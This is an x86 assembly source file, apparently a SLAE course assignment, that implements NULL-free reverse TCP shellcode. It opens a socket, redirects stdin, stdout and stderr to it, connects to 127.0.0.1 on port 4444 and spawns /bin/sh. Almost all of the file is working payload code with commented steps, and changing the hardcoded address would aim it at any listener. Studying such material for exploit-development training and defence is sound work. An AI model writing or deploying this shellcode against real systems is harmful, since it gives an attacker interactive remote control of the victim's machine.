; John
;
; Reverse TCP Shell - Assignment 2
;
; SecurityTube Linux Assembler Expert (SLAE) 32-bit
;
; September 25, 2020


global _start

section .text

_start:

	; socket(AF_INET, SOCK_STREAM, 0)
	xor eax, eax
	mov ax, 0x167		; eax = syscall 359
	xor ebx, ebx
	mov bl, 0x2		; ebx = AF_INET
	xor ecx, ecx
	mov cl, 0x1		; ecx = SOCK_STREAM
	xor edx,edx		; edx = 0
	int 0x80
	mov edi, eax		; store fd into edi for later


	; duplicate file descriptor from accept() to all stdio fds (out, in, err)
        mov ebx, edi    ; ebx = new file descriptor
        xor edx, edx    ; edx = 0 for cmp instruction
        xor ecx, ecx    ; zero out ecx
        mov cl, 0x3     ; initialize loop counter and target file descriptors (2,1,0)

    duplicate:
        xor eax, eax
        mov al, 0x3f    ; eax = syscall 63
        dec ecx         ; ecx = target file descriptor to duplicate to
        int 0x80
        cmp ecx, edx    ; does ecx = 0? set ZF if true.
        jne duplicate   ; if ecx != 0, jump to 'duplicate'


	; set sockaddr home parameters
	; htons means numbers are stored significant byte first. 4444 = 0x115c
	; so load 0x11 first, then 0x5c. htons 'syscall' not needed!
	; to set the structure, throw all values on the stack and set esp to ecx!
	xor edx, edx			; edx = 0
	push DWORD 0x01bbbb7f		; No NULLs!!
	mov WORD [esp + 1], dx		; sin_addr = 127.0.0.1
	push WORD 0x5c11		; sin_port = 4444
	push WORD 0x2			; sin_family = AF_INET
	mov ecx, esp			; ecx = {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}


	; connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16)
	xor ebx, ebx
	mov ebx, edi		; ebx = fd
	xor eax, eax
	mov ax, 0x16a		; eax = syscall 362
	xor edx, edx
	mov dl, 0x10		; edx = 16
	int 0x80		; syscall to connect() at 362


	; execve("//bin/sh", (char*[]){"//bin/sh", NULL}, NULL)
	xor eax, eax
	push eax	; first NULL onto stack
	push 0x68732f6e
	push 0x69622f2f	; push "//bin/sh" backwards onto stack
	mov ebx, esp	; ebx = "//bin/sh"
	push eax	; push NULL
	mov edx, esp	; edx points to NULL
	push ebx	; push "//bin/sh" back onto stack
	mov ecx, esp	; ecx points to start of "//bin/sh" followed by NULL
	mov al, 0xb	; eax = syscall 11
	int 0x80
